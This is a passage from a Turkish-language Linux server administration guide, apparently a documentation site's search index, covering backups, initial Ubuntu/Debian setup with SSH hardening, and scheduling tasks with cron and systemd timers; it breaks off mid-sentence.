<li>Temel OS - \u0130lk kurulum sonras\u0131 yap\u0131lmas\u0131 gerekenler</li> <li>Kullan\u0131c\u0131 Y\u00f6netimi - Kullan\u0131c\u0131 olu\u015fturma, sudo, SSH key</li> <li>Shell Konfig\u00fcrasyonu - <code>.bashrc</code>, alias, PATH y\u00f6netimi</li> <li>Dosya \u0130zinleri - chmod, chown, umask, ACL</li> <li>Paket Y\u00f6netimi - apt, yum, snap kullan\u0131m\u0131</li> <li>Swap Bellek - Swap alan\u0131 olu\u015fturma ve optimizasyon</li> </ul>"},{"location":"how-to/#altyap-servisleri","title":"\ud83c\udfd7\ufe0f Altyap\u0131 Servisleri","text":"<p>Production ortam\u0131 i\u00e7in gerekli servisler:</p> <ul> <li>Docker &amp; Storage - Docker kurulumu ve disk y\u00f6netimi</li> <li>Nginx - Web sunucusu kurulumu</li> <li>Reverse Proxy - Nginx ile reverse proxy yap\u0131land\u0131rmas\u0131</li> <li>TLS - SSL/TLS sertifika y\u00f6netimi (Let's Encrypt)</li> </ul>"},{"location":"how-to/#otomasyon","title":"\u2699\ufe0f Otomasyon","text":"<p>Zamanlanm\u0131\u015f g\u00f6revler ve servis y\u00f6netimi:</p> <ul> <li>Systemd Servis - Systemd ile servis tan\u0131mlama</li> <li>Zamanlanm\u0131\u015f G\u00f6revler (Cron) - Cron, systemd timers, anacron, at</li> </ul>"},{"location":"how-to/#bakm-izleme","title":"\ud83d\udd27 Bak\u0131m &amp; \u0130zleme","text":"<p>Sistem sa\u011fl\u0131\u011f\u0131 ve veri g\u00fcvenli\u011fi:</p> <ul> <li>Monitoring - Sistem izleme ara\u00e7lar\u0131</li> <li>Monitoring Stack - Prometheus + Grafana kurulumu</li> <li>Logrotate - Log dosyas\u0131 rotasyonu</li> <li>Yedekleme (Backup) - Yedekleme stratejileri</li> <li>Sistem Snapshot (Timeshift) - Sistem anl\u0131k g\u00f6r\u00fcnt\u00fcleri</li> <li>Sistem Klonlama (Tar) - Sunucu klonlama</li> </ul>"},{"location":"how-to/#network","title":"\ud83c\udf10 Network","text":"<p>A\u011f ve port y\u00f6netimi:</p> <ul> <li>A\u011f/Port Kontrolleri - Port dinleme, network troubleshooting</li> </ul>"},{"location":"how-to/#nasl-kullanlr","title":"\ud83d\udcd6 Nas\u0131l Kullan\u0131l\u0131r?","text":"<ol> <li>Yeni Sunucu: Yukar\u0131dan a\u015fa\u011f\u0131ya s\u0131rayla ilerleyin (Temel Sistem \u2192 Altyap\u0131 \u2192 Otomasyon \u2192 Bak\u0131m)</li> <li>Belirli Bir Konu: Sol men\u00fcden ilgili sayfaya direkt gidin</li> <li>H\u0131zl\u0131 Referans: Her sayfada kopyala-yap\u0131\u015ft\u0131r haz\u0131r komutlar bulacaks\u0131n\u0131z</li> </ol>"},{"location":"how-to/#hzl-baslangc","title":"\ud83d\ude80 H\u0131zl\u0131 Ba\u015flang\u0131\u00e7","text":"<p>Yeni bir sunucu kuruyorsan\u0131z, \u015fu s\u0131ray\u0131 takip edin:</p> <ol> <li>\u2705 Temel OS - Sistem g\u00fcncellemeleri, timezone, hostname</li> <li>\u2705 Kullan\u0131c\u0131 Y\u00f6netimi - Sudo kullan\u0131c\u0131s\u0131 olu\u015ftur</li> <li>\u2705 Shell Konfig\u00fcrasyonu - Alias ve PATH ayarla</li> <li>\u2705 Dosya \u0130zinleri - \u0130zin y\u00f6netimini \u00f6\u011fren</li> <li>\u2705 Docker - Container altyap\u0131s\u0131n\u0131 kur</li> <li>\u2705 Nginx - Web sunucusunu kur</li> <li>\u2705 TLS - SSL sertifikas\u0131 al</li> <li>\u2705 Monitoring Stack - \u0130zleme sistemini kur</li> <li>\u2705 Cron - Otomasyonu ayarla</li> <li>\u2705 Yedekleme - Backup stratejisi olu\u015ftur</li> </ol> <p>[!TIP] &gt; G\u00fcvenlik: Kurulum tamamland\u0131ktan sonra G\u00fcvenlik b\u00f6l\u00fcm\u00fcne ge\u00e7erek sunucunuzu sertle\u015ftirin!</p>"},{"location":"how-to/#ilgili-bolumler","title":"\ud83d\udd17 \u0130lgili B\u00f6l\u00fcmler","text":"<ul> <li>G\u00fcvenlik - Sunucunuzu koruma alt\u0131na al\u0131n</li> <li>\u015eablonlar - Haz\u0131r konfig\u00fcrasyon dosyalar\u0131</li> <li>Scriptler - Otomasyon scriptleri</li> <li>Kontrol Listeleri - \u0130lk kurulum checklist</li> </ul>"},{"location":"how-to/backups/","title":"Yedekleme Stratejisi ve Otomasyonu","text":"<p>\"Yedek yoksa, veri yoktur.\"</p>"},{"location":"how-to/backups/#1-3-2-1-kural","title":"1. 3-2-1 Kural\u0131","text":"<p>Basit ama hayat kurtar\u0131r:</p> <ul> <li>3 kopya veriniz olsun (1 canl\u0131, 2 yedek).</li> <li>2 farkl\u0131 medya kullan\u0131n (Sunucu diski + Harici Depolama).</li> <li>1 kopya mutlaka \"Off-site\" (Sunucu d\u0131\u015f\u0131nda) olsun.</li> </ul>"},{"location":"how-to/backups/#2-otomatik-yedekleme-scripti","title":"2. Otomatik Yedekleme Scripti","text":"<p>A\u015fa\u011f\u0131daki script, belirledi\u011finiz klas\u00f6rleri ve MySQL/Postgres veritaban\u0131n\u0131 s\u0131k\u0131\u015ft\u0131r\u0131p tarihli olarak <code>/backups</code> dizinine atar.</p> <p>Bu script Script K\u00fct\u00fcphanesi &gt; Veritaban\u0131 Yedekleme alt\u0131nda detayland\u0131r\u0131lm\u0131\u015ft\u0131r.</p> <pre><code># Scripti \u00e7al\u0131\u015ft\u0131rma \u00f6rne\u011fi\n/root/scripts/backup-db.sh\n</code></pre>"},{"location":"how-to/backups/#3-zamanlama-cron","title":"3. Zamanlama (Cron)","text":"<p>Scripti her gece 03:00'da \u00e7al\u0131\u015ft\u0131rmak i\u00e7in:</p> <pre><code>crontab -e\n</code></pre> <p>Eklenecek sat\u0131r:</p> <pre><code>0 3 * * * /bin/bash /root/scripts/backup-db.sh &gt;&gt; /var/log/backup.log 2&gt;&amp;1\n</code></pre>"},{"location":"how-to/backups/#4-off-site-transfer-rclone","title":"4. Off-Site Transfer (Rclone)","text":"<p>Yedekleri sunucuda tutmak yetmez. <code>rclone</code> kullanarak S3, Google Drive veya Dropbox'a at\u0131n.</p> <p>Rclone kurulumu ve detayl\u0131 kullan\u0131m\u0131 script dosyas\u0131n\u0131n i\u00e7inde a\u00e7\u0131klanm\u0131\u015ft\u0131r (bkz: backup-db.sh).</p>"},{"location":"how-to/base-os/","title":"Temel OS Kurulumu \ud83d\udda5\ufe0f","text":"<p>Yeni bir Ubuntu/Debian sunucusuna ilk giri\u015f yapt\u0131ktan sonra yap\u0131lmas\u0131 gereken temel ayarlar ve g\u00fcvenlik \u00f6nlemleri.</p>"},{"location":"how-to/base-os/#1-ilk-baglant-ssh","title":"1. \u0130lk Ba\u011flant\u0131 (SSH)","text":""},{"location":"how-to/base-os/#root-ile-ilk-giris","title":"Root ile \u0130lk Giri\u015f","text":"<pre><code># Varsay\u0131lan SSH portu (22)\nssh root@SUNUCU_IP\n\n# \u00d6zel port kullan\u0131yorsan\u0131z\nssh -p 2222 root@SUNUCU_IP\n\n# SSH key ile ba\u011flanma\nssh -i ~/.ssh/id_rsa root@SUNUCU_IP\n</code></pre> <p>[!WARNING] &gt; G\u00fcvenlik: Root ile SSH ba\u011flant\u0131s\u0131n\u0131 m\u00fcmk\u00fcn olan en k\u0131sa s\u00fcrede kapatmal\u0131s\u0131n\u0131z. \u00d6nce sudo yetkili kullan\u0131c\u0131 olu\u015fturun.</p>"},{"location":"how-to/base-os/#2-sistem-guncellemeleri","title":"2. Sistem G\u00fcncellemeleri","text":"<pre><code># Paket listesini g\u00fcncelle\napt update\n\n# T\u00fcm paketleri y\u00fckselt\napt upgrade -y\n\n# Tam y\u00fckseltme (kernel dahil)\napt full-upgrade -y\n\n# Gereksiz paketleri temizle\napt autoremove -y\napt autoclean\n</code></pre>"},{"location":"how-to/base-os/#3-yonetici-kullanc-olusturma","title":"3. Y\u00f6netici Kullan\u0131c\u0131 Olu\u015fturma","text":"<p>Root yerine sudo yetkili kullan\u0131c\u0131 kullan\u0131n:</p> <pre><code># Yeni kullan\u0131c\u0131 olu\u015ftur\nadduser deploy\n\n# Sudo grubuna ekle\nusermod -aG sudo deploy\n\n# Kullan\u0131c\u0131y\u0131 kontrol et\nid deploy\ngroups deploy\n</code></pre>"},{"location":"how-to/base-os/#ssh-key-kopyalama-onemli","title":"SSH Key Kopyalama (\u00d6nemli!)","text":"<p>Root'tan yeni kullan\u0131c\u0131ya SSH key'i kopyalay\u0131n:</p> <pre><code># Root'un SSH key'ini kopyala\nmkdir -p /home/deploy/.ssh\ncp /root/.ssh/authorized_keys /home/deploy/.ssh/\nchown -R deploy:deploy /home/deploy/.ssh\nchmod 700 /home/deploy/.ssh\nchmod 600 /home/deploy/.ssh/authorized_keys\n</code></pre> <p>Test Edin:</p> <pre><code># Yeni terminalde test et (root oturumunu KAPATMAYIN!)\nssh deploy@SUNUCU_IP\nsudo whoami  # \"root\" \u00e7\u0131kt\u0131s\u0131 vermeli\n</code></pre>"},{"location":"how-to/base-os/#4-ssh-port-degistirme-guvenlik","title":"4. SSH Port De\u011fi\u015ftirme (G\u00fcvenlik)","text":"<p>Varsay\u0131lan 22 portu yerine \u00f6zel port kullan\u0131n (bot sald\u0131r\u0131lar\u0131n\u0131 azalt\u0131r):</p> <pre><code># SSH config dosyas\u0131n\u0131 d\u00fczenle\nsudo nano /etc/ssh/sshd_config\n</code></pre> <p>De\u011fi\u015ftirilecek sat\u0131rlar:</p> <pre><code># Port de\u011fi\u015ftir (\u00f6rn: 2222)\nPort 2222\n\n# Root giri\u015fini kapat\nPermitRootLogin no\n\n# \u015eifre ile giri\u015fi kapat (sadece SSH key)\nPasswordAuthentication no\n\n# Bo\u015f \u015fifreleri engelle\nPermitEmptyPasswords no\n</code></pre> <p>SSH'yi yeniden ba\u015flat:</p> <pre><code>sudo systemctl restart sshd\n\n# Yeni port dinliyor mu kontrol et\nsudo ss -tlnp | grep 2222\n</code></pre> <p>Firewall'da portu a\u00e7:</p> <pre><code># UFW kullan\u0131yorsan\u0131z\nsudo ufw allow 2222/tcp\nsudo ufw delete allow 22/tcp  # Eski portu kapat\n</code></pre> <p>[!CAUTION] &gt; Dikkat: Yeni port ile ba\u011flant\u0131y\u0131 test etmeden eski oturumu KAPATMAYIN! Aksi halde sunucuya eri\u015fiminizi kaybedebilirsiniz.</p> <p>Yeni port ile ba\u011flanma:</p> <pre><code>ssh -p 2222 deploy@SUNUCU_IP\n</code></pre>"},{"location":"how-to/base-os/#5-hostname-ve-timezone-ayarlar","title":"5. Hostname ve Timezone Ayarlar\u0131","text":""},{"location":"how-to/base-os/#hostname-degistirme","title":"Hostname De\u011fi\u015ftirme","text":"<pre><code># Hostname ayarla\nsudo hostnamectl set-hostname production-server\n\n# Kontrol et\nhostnamectl\n\n# /etc/hosts dosyas\u0131n\u0131 g\u00fcncelle\nsudo nano /etc/hosts\n</code></pre> <p><code>/etc/hosts</code> i\u00e7eri\u011fi:</p> <pre><code>127.0.0.1 localhost\n127.0.1.1 production-server\n\n# Sunucu IP'si\nYOUR_SERVER_IP production-server\n</code></pre>"},{"location":"how-to/base-os/#timezone-ayarlama","title":"Timezone Ayarlama","text":"<pre><code># Mevcut timezone\ntimedatectl\n\n# Timezone listesi\ntimedatectl list-timezones | grep Istanbul\n\n# Timezone ayarla\nsudo timedatectl set-timezone Europe/Istanbul\n\n# Zaman senkronizasyonu aktif et\nsudo systemctl enable --now systemd-timesyncd\n\n# Kontrol et\ntimedatectl status\n</code></pre>"},{"location":"how-to/base-os/#6-temel-araclar-kurulumu","title":"6. Temel Ara\u00e7lar Kurulumu \ud83e\uddf0","text":"<pre><code>sudo apt install -y \\\n  curl \\\n  wget \\\n  git \\\n  htop \\\n  btop \\\n  jq \\\n  dialog \\\n  net-tools \\\n  vim \\\n  nano \\\n  unzip \\\n  zip \\\n  tree \\\n  ncdu \\\n  tmux \\\n  screen\n</code></pre>"},{"location":"how-to/base-os/#araclarn-kullanm-alanlar","title":"Ara\u00e7lar\u0131n Kullan\u0131m Alanlar\u0131","text":"Ara\u00e7 Kullan\u0131m <code>curl</code>, <code>wget</code> Dosya indirme, API testleri <code>git</code> Kod ve config y\u00f6netimi <code>htop</code>, <code>btop</code> Sistem kaynak izleme (CPU/RAM) <code>jq</code> JSON parse etme <code>dialog</code> Terminal UI scriptleri <code>net-tools</code> Network komutlar\u0131 (ifconfig, netstat) <code>vim</code>, <code>nano</code> Metin edit\u00f6rleri <code>tree</code> Dizin yap\u0131s\u0131n\u0131 g\u00f6rselle\u015ftirme <code>ncdu</code> Disk kullan\u0131m\u0131 analizi <code>tmux</code>, <code>screen</code> Terminal multiplexer"},{"location":"how-to/base-os/#7-dusuk-kaynakl-sistemler-icin-optimizasyon","title":"7. D\u00fc\u015f\u00fck Kaynakl\u0131 Sistemler \u0130\u00e7in Optimizasyon \ud83d\udc0c","text":""},{"location":"how-to/base-os/#a-swappiness-ayar","title":"A. Swappiness Ayar\u0131","text":"<p>D\u00fc\u015f\u00fck RAM'li sistemlerde swap kullan\u0131m\u0131n\u0131 optimize edin:</p> <pre><code># Mevcut de\u011fer (varsay\u0131lan: 60)\ncat /proc/sys/vm/swappiness\n\n# D\u00fc\u015f\u00fck RAM i\u00e7in \u00f6nerilen: 10\necho \"vm.swappiness=10\" | sudo tee -a /etc/sysctl.conf\nsudo sysctl -p\n</code></pre>"},{"location":"how-to/base-os/#b-gereksiz-servisleri-devre-ds-brakma","title":"B. Gereksiz Servisleri Devre D\u0131\u015f\u0131 B\u0131rakma","text":"<pre><code># \u00c7al\u0131\u015fan servisleri listele\nsystemctl list-unit-files --state=enabled\n\n# Gereksiz servisleri durdur (\u00f6rnekler)\nsudo systemctl disable --now bluetooth.service\nsudo systemctl disable --now cups.service\nsudo systemctl disable --now avahi-daemon.service\n</code></pre>"},{"location":"how-to/base-os/#c-minimal-kernel-parametreleri","title":"C. Minimal Kernel Parametreleri","text":"<p><code>/etc/sysctl.conf</code> dosyas\u0131na ekleyin:</p> <pre><code># D\u00fc\u015f\u00fck RAM i\u00e7in\nvm.vfs_cache_pressure=50\nvm.dirty_ratio=10\nvm.dirty_background_ratio=5\n\n# Network buffer'lar\u0131 k\u00fc\u00e7\u00fclt\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\n</code></pre> <p>Uygula:</p> <pre><code>sudo sysctl -p\n</code></pre>"},{"location":"how-to/base-os/#d-hafif-alternatifler","title":"D. Hafif Alternatifler","text":"Standart Hafif Alternatif <code>htop</code> <code>btop</code> (daha hafif) <code>systemd-journald</code> Log boyutunu s\u0131n\u0131rla <code>snapd</code> Kald\u0131r (gereksizse) <p>snapd kald\u0131rma (iste\u011fe ba\u011fl\u0131):</p> <pre><code>sudo apt purge snapd -y\nsudo apt autoremove -y\n</code></pre> <p>journald log boyutu s\u0131n\u0131rlama:</p> <pre><code>sudo nano /etc/systemd/journald.conf\n</code></pre> <pre><code>[Journal]\nSystemMaxUse=100M\nSystemMaxFileSize=10M\n</code></pre> <pre><code>sudo systemctl restart systemd-journald\n</code></pre>"},{"location":"how-to/base-os/#8-otomatik-guvenlik-guncellemeleri","title":"8. Otomatik G\u00fcvenlik G\u00fcncellemeleri","text":"<pre><code># Unattended-upgrades kur\nsudo apt install unattended-upgrades -y\n\n# Aktif et\nsudo dpkg-reconfigure --priority=low unattended-upgrades\n\n# Konfig\u00fcrasyon\nsudo nano /etc/apt/apt.conf.d/50unattended-upgrades\n</code></pre> <p>\u00d6nerilen ayarlar:</p> <pre><code>Unattended-Upgrade::Allowed-Origins {\n    \"${distro_id}:${distro_codename}-security\";\n    \"${distro_id}ESMApps:${distro_codename}-apps-security\";\n};\n\nUnattended-Upgrade::AutoFixInterruptedDpkg \"true\";\nUnattended-Upgrade::MinimalSteps \"true\";\nUnattended-Upgrade::Remove-Unused-Dependencies \"true\";\nUnattended-Upgrade::Automatic-Reboot \"false\";\n</code></pre>"},{"location":"how-to/base-os/#9-sistem-bilgilerini-goruntuleme","title":"9. Sistem Bilgilerini G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># OS versiyonu\nlsb_release -a\n\n# Kernel versiyonu\nuname -r\n\n# CPU bilgisi\nlscpu\n\n# RAM bilgisi\nfree -h\n\n# Disk bilgisi\ndf -h\n\n# \u00c7al\u0131\u015fma s\u00fcresi\nuptime\n\n# Sistem y\u00fck\u00fc\ntop\nhtop\n</code></pre>"},{"location":"how-to/base-os/#10-dogrulama-checklist","title":"10. Do\u011frulama Checklist \u2705","text":"<p>Kurulumu tamamlad\u0131ktan sonra kontrol edin:</p> <ul> <li>[ ] Sistem g\u00fcncel (<code>apt update &amp;&amp; apt upgrade</code>)</li> <li>[ ] Sudo yetkili kullan\u0131c\u0131 olu\u015fturuldu (<code>deploy</code>)</li> <li>[ ] SSH key ile ba\u011flan\u0131labiliyor</li> <li>[ ] SSH portu de\u011fi\u015ftirildi (varsay\u0131lan 22 de\u011fil)</li> <li>[ ] Root SSH giri\u015fi kapat\u0131ld\u0131 (<code>PermitRootLogin no</code>)</li> <li>[ ] Hostname ayarland\u0131 (<code>hostnamectl</code>)</li> <li>[ ] Timezone ayarland\u0131 (<code>timedatectl</code>)</li> <li>[ ] Temel ara\u00e7lar kuruldu (<code>htop</code>, <code>git</code>, <code>curl</code>)</li> <li>[ ] Otomatik g\u00fcvenlik g\u00fcncellemeleri aktif</li> <li>[ ] Firewall yap\u0131land\u0131r\u0131ld\u0131 (UFW)</li> </ul>"},{"location":"how-to/base-os/#sonraki-admlar","title":"\ud83d\udd17 Sonraki Ad\u0131mlar","text":"<ol> <li>Kullan\u0131c\u0131 Y\u00f6netimi - Ek kullan\u0131c\u0131lar ve SSH key y\u00f6netimi</li> <li>G\u00fcvenlik - SSH Hardening - SSH'yi daha da g\u00fcvenli hale getirin</li> <li>G\u00fcvenlik - Firewall - UFW ile firewall kurulumu</li> <li>Docker Kurulumu - Container altyap\u0131s\u0131n\u0131 kurun</li> </ol>"},{"location":"how-to/base-os/#referanslar","title":"\ud83d\udcda Referanslar","text":"<ul> <li>Ubuntu Server Guide</li> <li>Debian Administrator's Handbook</li> <li>SSH Hardening Guide</li> </ul>"},{"location":"how-to/cron/","title":"Zamanlanm\u0131\u015f G\u00f6revler (Cron) \u23f0","text":"<p>Linux sunucular\u0131nda periyodik i\u015flemler (yedekleme, log temizleme, rapor alma vb.) i\u00e7in Cron kullan\u0131l\u0131r. En temel ve g\u00fcvenilir otomasyon arac\u0131d\u0131r.</p>"},{"location":"how-to/cron/#1-cron-sozdizimi-syntax","title":"1. Cron S\u00f6zdizimi (Syntax)","text":"<p>Bir Cron i\u015fi (job) tan\u0131mlarken \u015fu 5 zaman dilimini kullan\u0131r\u0131z:</p> <pre><code>* * * * * komut\n\u2502 \u2502 \u2502 \u2502 \u2502\n\u2502 \u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500 Haftan\u0131n G\u00fcn\u00fc (0 - 7) (Pazar = 0 veya 7)\n\u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500 Ay (1 - 12)\n\u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Ay\u0131n G\u00fcn\u00fc (1 - 31)\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Saat (0 - 23)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Dakika (0 - 59)\n</code></pre> <p>[!TIP] &gt; Yard\u0131mc\u0131 Ara\u00e7: Zamanlamay\u0131 g\u00f6rselle\u015ftirmek i\u00e7in crontab.guru sitesini kullanabilirsiniz.</p>"},{"location":"how-to/cron/#2-temel-komutlar","title":"2. Temel Komutlar","text":"<p>Kendi kullan\u0131c\u0131n\u0131z (root de\u011filse <code>sudo</code> kullanmay\u0131n) i\u00e7in zamanlanm\u0131\u015f g\u00f6revleri y\u00f6netmek:</p> <pre><code># Mevcut g\u00f6revleri listele\ncrontab -l\n\n# G\u00f6revleri d\u00fczenle (Edit\u00f6r a\u00e7ar)\ncrontab -e\n\n# T\u00fcm g\u00f6revleri sil (Dikkat!)\ncrontab -r\n</code></pre>"},{"location":"how-to/cron/#3-yaygn-kullanm-ornekleri","title":"3. Yayg\u0131n Kullan\u0131m \u00d6rnekleri","text":"Zamanlama Kod A\u00e7\u0131klama Her Dakika <code>* * * * *</code> Test ama\u00e7l\u0131 veya \u00e7ok s\u0131k gereken i\u015fler. Her 5 Dakikada Bir <code>*/5 * * * *</code> <code>*/</code> operat\u00f6r\u00fc \"her X'te bir\" demektir. Her Saat Ba\u015f\u0131 <code>0 * * * *</code> Dakika 0 oldu\u011funda \u00e7al\u0131\u015f\u0131r. Her Gece Yar\u0131s\u0131 <code>0 0 * * *</code> G\u00fcnl\u00fck yedekler i\u00e7in idealdir. (00:00) Her Pazar 04:00 <code>0 4 * * 0</code> Haftal\u0131k bak\u0131m i\u015flemleri i\u00e7in. A\u00e7\u0131l\u0131\u015fta (Reboot) <code>@reboot</code> Sunucu yeniden ba\u015flad\u0131\u011f\u0131nda bir kez \u00e7al\u0131\u015f\u0131r."},{"location":"how-to/cron/#ornek-bir-satr","title":"\u00d6rnek Bir Sat\u0131r:","text":"<pre><code># Her gece 03:30'da yedek al\n30 03 * * * /home/kullanici/scripts/yedek_al.sh\n</code></pre>"},{"location":"how-to/cron/#4-kullanc-crontab-vs-sistem-crontab","title":"4. Kullan\u0131c\u0131 Crontab vs Sistem Crontab","text":"<p>\u0130ki farkl\u0131 yerde tan\u0131mlama yapabilirsiniz. Aralar\u0131ndaki fark, \"Kullan\u0131c\u0131\" s\u00fctunudur.</p>"},{"location":"how-to/cron/#a-kullanc-crontab-crontab-e","title":"A. Kullan\u0131c\u0131 Crontab (<code>crontab -e</code>)","text":"<p>Sadece o kullan\u0131c\u0131n\u0131n yetkisiyle \u00e7al\u0131\u015f\u0131r. Komut sat\u0131r\u0131nda kullan\u0131c\u0131 ad\u0131 yaz\u0131lmaz.</p> <pre><code># Do\u011fru (crontab -e)\n0 1 * * * /script.sh\n</code></pre>"},{"location":"how-to/cron/#b-sistem-crontab-etccrontab-veya-etccrond","title":"B. Sistem Crontab (<code>/etc/crontab</code> veya <code>/etc/cron.d/*</code>)","text":"<p>T\u00fcm sistem i\u00e7in ge\u00e7erlidir. Hangi kullan\u0131c\u0131 yetkisiyle \u00e7al\u0131\u015faca\u011f\u0131 belirtilmelidir.</p> <pre><code># /etc/cron.d/yedekleme\n# Dakika Saat Gun Ay Gun Kullanici Komut\n0 1 * * * root /script.sh\n</code></pre> <p>[!CAUTION] Prod\u00fcksiyon ortamlar\u0131nda <code>/etc/cron.d/</code> i\u00e7ine her uygulama i\u00e7in ayr\u0131 dosya olu\u015fturmak (\u00d6rn: <code>/etc/cron.d/app-backup</code>) daha d\u00fczenli ve y\u00f6netilebilir bir y\u00f6ntemdir.</p>"},{"location":"how-to/cron/#5-ckt-yonetimi-ve-loglama-onemli","title":"5. \u00c7\u0131kt\u0131 Y\u00f6netimi ve Loglama (\u00d6nemli) \ud83d\udcdd","text":"<p>Varsay\u0131lan olarak Cron, bir \u00e7\u0131kt\u0131 (output) \u00fcretirse bunu mail atmaya \u00e7al\u0131\u015f\u0131r (\u00e7o\u011fu sunucuda mail ayarl\u0131 olmad\u0131\u011f\u0131 i\u00e7in bu mesajlar kaybolur).</p>"},{"location":"how-to/cron/#yontem-1-sessize-alma-silent","title":"Y\u00f6ntem 1: Sessize Alma (Silent)","text":"<p>E\u011fer \u00e7\u0131kt\u0131 \u00f6nemli de\u011filse (\u00e7\u00f6p kutusu):</p> <pre><code>* * * * * /komut.sh &gt; /dev/null 2&gt;&amp;1\n</code></pre>"},{"location":"how-to/cron/#yontem-2-dosyaya-loglama-onerilen","title":"Y\u00f6ntem 2: Dosyaya Loglama (\u00d6nerilen)","text":"<p>Yapt\u0131\u011f\u0131 i\u015fi ve hatalar\u0131 g\u00f6rmek i\u00e7in:</p> <pre><code># &gt;&gt; ile dosyan\u0131n sonuna ekle (append)\n* * * * * /komut.sh &gt;&gt; /var/log/ozel-is.log 2&gt;&amp;1\n</code></pre>"},{"location":"how-to/cron/#6-sk-yaplan-hatalar-tuzaklar","title":"6. S\u0131k Yap\u0131lan Hatalar (Tuzaklar) \ud83e\udea4","text":"<p>Cron \u00e7al\u0131\u015fm\u0131yorsa %90 sebebi \u015funlard\u0131r:</p>"},{"location":"how-to/cron/#1-cevre-degiskenleri-path-sorunu","title":"1. \u00c7evre De\u011fi\u015fkenleri (PATH Sorunu)","text":"<p>Cron, sizin terminalinizdeki <code>PATH</code> de\u011fi\u015fkenlerini (\u00f6rn. <code>.bashrc</code>) bilmez. Hata: <code>node: command not found</code> \u00c7\u00f6z\u00fcm: Komutlar\u0131n tam yolunu yaz\u0131n.</p> <ul> <li>Yanl\u0131\u015f: <code>python3 script.py</code></li> <li>Do\u011fru: <code>/usr/bin/python3 /home/user/script.py</code></li> </ul>"},{"location":"how-to/cron/#2-yuzde-isareti","title":"2. Y\u00fczde \u0130\u015fareti (<code>%</code>)","text":"<p>Cron dosyas\u0131nda <code>%</code> karakteri \"yeni sat\u0131r\" anlam\u0131na gelir. E\u011fer komutunuzda <code>%</code> varsa (\u00f6rn: <code>date +%F</code>), ters slash ile ka\u00e7mal\u0131s\u0131n\u0131z: <code>\\%</code>.</p>"},{"location":"how-to/cron/#3-dosya-izinleri","title":"3. Dosya \u0130zinleri","text":"<p>\u00c7al\u0131\u015ft\u0131r\u0131cak scripti executable yapmay\u0131 unutmay\u0131n:</p> <pre><code>chmod +x /home/user/script.sh\n</code></pre>"},{"location":"how-to/cron/#4-yeni-satr-newline","title":"4. Yeni Sat\u0131r (Newline)","text":"<p>Cron dosyas\u0131n\u0131n (\u00f6zellikle <code>/etc/cron.d/</code> alt\u0131ndakilerin) son sat\u0131r\u0131 bo\u015f olmal\u0131d\u0131r. Dosya bir komutla bitiyorsa ve enter'a bas\u0131lmam\u0131\u015fsa \u00e7al\u0131\u015fmayabilir.</p>"},{"location":"how-to/cron/#7-cron-alternatifleri","title":"7. Cron Alternatifleri \ud83d\udd04","text":"<p>Modern Linux sistemlerinde cron'a alternatif veya onu tamamlayan ara\u00e7lar vard\u0131r. Her birinin farkl\u0131 kullan\u0131m senaryolar\u0131 vard\u0131r.</p>"},{"location":"how-to/cron/#a-systemd-timers-onerilen-modern-yontem","title":"A. Systemd Timers (\u00d6nerilen - Modern Y\u00f6ntem)","text":"<p>Ubuntu 16.04'ten beri varsay\u0131lan olarak gelir. Cron'dan daha g\u00fc\u00e7l\u00fc ve daha esnektir.</p> <p>Avantajlar\u0131:</p> <ul> <li>\u2705 Systemd ile entegre (servislerin durumuna g\u00f6re tetikleme)</li> <li>\u2705 Detayl\u0131 loglama (<code>journalctl</code> ile)</li> <li>\u2705 G\u00f6revler aras\u0131 ba\u011f\u0131ml\u0131l\u0131k y\u00f6netimi</li> <li>\u2705 Esnek zamanlama (\"boot'tan 15 dakika sonra\" gibi)</li> <li>\u2705 Persistent (ka\u00e7\u0131r\u0131lan g\u00f6revleri telafi eder)</li> </ul> <p>Nas\u0131l Kullan\u0131l\u0131r?</p> <p>\u0130ki dosya gerekir:</p> <ol> <li>Service dosyas\u0131 (<code>.service</code>) \u2192 Ne yap\u0131lacak?</li> <li>Timer dosyas\u0131 (<code>.timer</code>) \u2192 Ne zaman yap\u0131lacak?</li> </ol> <p>\u00d6rnek: Her 10 dakikada bir backup</p> <p>1. Service dosyas\u0131 olu\u015ftur:</p> <pre><code>sudo nano /etc/systemd/system/mybackup.service\n</code></pre> <pre><code>[Unit]\nDescription=My Backup Task\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/backup.sh\nUser=ubuntu\nStandardOutput=journal\nStandardError=journal\n</code></pre> <p>2. Timer dosyas\u0131 olu\u015ftur:</p> <pre><code>sudo nano /etc/systemd/system/mybackup.timer\n</code></pre> <pre><code>[Unit]\nDescription=Run backup every 10 minutes\n\n[Timer]\nOnBootSec=5min           # Boot'tan 5 dakika sonra ilk \u00e7al\u0131\u015ft\u0131r\nOnUnitActiveSec=10min    # Her 10 dakikada bir tekrarla\nPersistent=true          # Ka\u00e7\u0131r\u0131lan g\u00f6revleri telafi et\n\n[Install]\nWantedBy=timers.target\n</code></pre> <p>3. Timer'\u0131 aktif et:</p> <pre><code># Systemd'ye yeni dosyalar\u0131 tan\u0131t\nsudo systemctl daemon-reload\n\n# Timer'\u0131 ba\u015flat ve enable et\nsudo systemctl enable --now mybackup.timer\n\n# Timer'\u0131n durumunu kontrol et\nsystemctl status mybackup.timer\n\n# T\u00fcm timer'lar\u0131 listele\nsystemctl list-timers --all\n</code></pre> <p>Zamanlama Se\u00e7enekleri:</p> Direktif A\u00e7\u0131klama \u00d6rnek <code>OnBootSec</code> Boot'tan X sonra <code>OnBootSec=5min</code> <code>OnUnitActiveSec</code> Son \u00e7al\u0131\u015fmadan X sonra <code>OnUnitActiveSec=10min</code> <code>OnCalendar</code> Belirli zaman <code>OnCalendar=daily</code> <code>OnCalendar</code> \u00d6zel zaman <code>OnCalendar=*-*-* 02:00:00</code> <code>OnCalendar</code> Haftal\u0131k <code>OnCalendar=Mon *-*-* 09:00:00</code> <code>OnCalendar</code> Ayl\u0131k <code>OnCalendar=*-*-01 03:00:00</code> <p>Kullan\u0131\u015fl\u0131 Komutlar:</p> <pre><code># T\u00fcm timer'lar\u0131 listele (--no-pager: scroll yapmadan t\u00fcm\u00fcn\u00fc g\u00f6ster)\nsystemctl list-timers --all --no-pager\n\n# Bir timer'\u0131 